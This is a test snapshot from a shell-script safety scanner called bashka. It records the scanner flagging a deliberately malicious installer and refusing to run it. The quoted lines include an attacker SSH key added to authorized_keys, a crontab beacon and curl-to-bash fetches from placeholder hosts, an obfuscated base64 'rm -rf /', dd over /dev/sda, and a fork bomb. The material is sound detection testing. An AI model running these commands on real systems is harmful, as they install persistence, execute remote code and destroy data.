@@ -1,0 +1,140 @@
+---
+source: tests/e2e.rs
+assertion_line: 225
+expression: run.stderr
+---
+✅ [privilege_escalation]: never escalates privileges
+  |
+  = note: Everything happens with your own permissions; nothing outside your home directory can be touched.
+
+🟡 [checksum]: downloads are never checksum- or signature-verified
+  |
+  = note: Whatever the server (or anyone between you and it) returns is used as-is.
+  = help: Publishers can ship a SHA256SUMS file next to releases and compare against it.
+
+🚩 [path_suspicious]: PATH includes a temporary or world-writable directory: `/tmp/.cache`
+ --> <stdin>:4:8
+  |
+4 | export PATH="/tmp/.cache:$PATH"
+  |        ^^^^^^^^^^^^^^^^^^^^^^^^ path
+  |
+  = note: Any file dropped there shadows real commands for the rest of the script (and your shell, if exported to rc files).
+
+🚩 [sensitive_write]: writes to sensitive file `~/.ssh/authorized_keys` via redirect
+ --> <stdin>:5:1
+  |
+5 | echo 'ssh-rsa AAAA attacker' >> ~/.ssh/authorized_keys
+  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ sensitive
+  |
+  = note: Changes persist beyond the install and affect every future shell, login or privilege check.
+  = help: Prefer installers that print the lines to add instead of editing files for you.
+
+🚩 [sensitive_write]: writes to sensitive file `~/.bashrc` via redirect
+ --> <stdin>:6:1
+  |
+6 | echo 'alias sudo="sudo -S"' >> "$HOME/.bashrc"
+  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^ sensitive
+  |
+  = note: Changes persist beyond the install and affect every future shell, login or privilege check.
+  = help: Prefer installers that print the lines to add instead of editing files for you.
+
+🚩 [scheduled_tasks]: installs a crontab that runs code on a schedule
+ --> <stdin>:7:55
+  |
+7 | echo "* * * * * curl -s http://1.2.3.4/beacon | sh" | crontab -
+  |                                                       ^^^^^^^^^ sensitive
+  |
+  = note: Scheduled jobs keep running long after the installer exits and are a common way to re-fetch a payload or hold persistence.
+  = help: Confirm the tool genuinely needs a background schedule; malware uses these to survive reboots.
+
+🚩 [sensitive_write]: installs a crontab
+ --> <stdin>:7:55
+  |
+7 | echo "* * * * * curl -s http://1.2.3.4/beacon | sh" | crontab -
+  |                                                       ^^^^^^^^^ sensitive
+  |
+  = note: Schedules code to keep running after the installer exits.
+
+🚩 [remote_exec]: executes a remote script via pipe: http://bit.ly/x9z
+ --> <stdin>:8:1
+  |
+8 | curl -s http://bit.ly/x9z | bash
+  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ remote
+  |
+  = note: The downloaded bytes run unreviewed with your privileges; the published script may differ from what this layer fetches at run time.
+  = help: bashka follows this forward and analyzes the inner script before anything runs.
+
+🚩 [domain_refs]: plaintext HTTP download: http://bit.ly/x9z
+ --> <stdin>:8:9
+  |
+8 | curl -s http://bit.ly/x9z | bash
+  |         ^^^^^^^^^^^^^^^^^ domain
+  |
+  = note: Anyone on the network path can replace the response body.
+
+🚩 [obfuscation]: decodes with `base64` and pipes the result into a shell
+ --> <stdin>:9:1
+  |
+9 | echo 'cm0gLXJmIC8=' | base64 -d | sh
+  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ obfuscation
+  |
+  = note: The real payload is hidden from readers and static analysis; only the decoder is visible.
+
+🚩 [obfuscation]: `eval` of computed content
+  --> <stdin>:10:1
+   |
+10 | eval "$(curl -s http://1.2.3.4/stage2)"
+   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ obfuscation
+   |
+   = note: Whatever the expansion yields at run time is executed as code; it cannot be reviewed ahead of time.
+
+🚩 [remote_exec]: executes a remote script via substitution: http://1.2.3.4/stage2
+  --> <stdin>:10:1
+   |
+10 | eval "$(curl -s http://1.2.3.4/stage2)"
+   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ remote
+   |
+   = note: The downloaded bytes run unreviewed with your privileges; the published script may differ from what this layer fetches at run time.
+   = help: bashka follows this forward and analyzes the inner script before anything runs.
+
+🚩 [domain_refs]: plaintext HTTP download: http://1.2.3.4/stage2
+  --> <stdin>:10:17
+   |
+10 | eval "$(curl -s http://1.2.3.4/stage2)"
+   |                 ^^^^^^^^^^^^^^^^^^^^^ domain
+   |
+   = note: Anyone on the network path can replace the response body.
+
+🚩 [banned_commands]: recursive forced deletion of `/`
+  --> <stdin>:11:1
+   |
+11 | rm -rf / --no-preserve-root
+   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^ exec
+   |
+   = note: Wipes the filesystem or the home directory.
+   = help: Do not run this script.
+
+🚩 [banned_commands]: raw write to a block device (`of=/dev/sda`)
+  --> <stdin>:12:1
+   |
+12 | dd if=/dev/zero of=/dev/sda bs=1M
+   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ exec
+   |
+   = note: Overwrites a disk directly, destroying its contents.
+   = help: Do not run this script.
+
+🚩 [banned_commands]: recursive world-writable permissions (`chmod -R 777`)
+  --> <stdin>:13:1
+   |
+13 | chmod -R 777 /usr/local
+   | ^^^^^^^^^^^^^^^^^^^^^^^ exec
+   |
+   = note: Lets any local user replace those files, including binaries you will run.
+   = help: Do not run this script.
+
+🚩 [banned_commands]: fork bomb
+  |
+  = note: A function that spawns itself recursively in the background until the system runs out of processes.
+
+✅ 1  🟡 1  🚩 15  RED | multiple red flags, explicit confirmation required
+⛔ ABORTED | not running the script  (pass --force to run it anyway, or run interactively to review)
